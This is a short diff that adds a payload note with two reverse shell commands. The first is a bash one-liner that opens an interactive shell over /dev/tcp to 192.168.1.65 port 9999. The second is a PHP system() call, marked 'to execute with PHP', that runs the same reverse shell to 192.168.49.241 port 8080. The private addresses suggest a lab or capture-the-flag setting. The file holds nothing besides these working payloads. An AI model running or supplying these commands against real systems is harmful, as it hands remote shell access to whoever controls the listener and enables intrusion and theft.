@@ -1,0 +1,5 @@
+bash -i >& /dev/tcp/192.168.1.65/9999 0>&1
+
+TO EXECUTE WITH PHP
+
+<pre>system("bash -c 'bash -i >& /dev/tcp/192.168.49.241/8080 0>&1'")</pre>
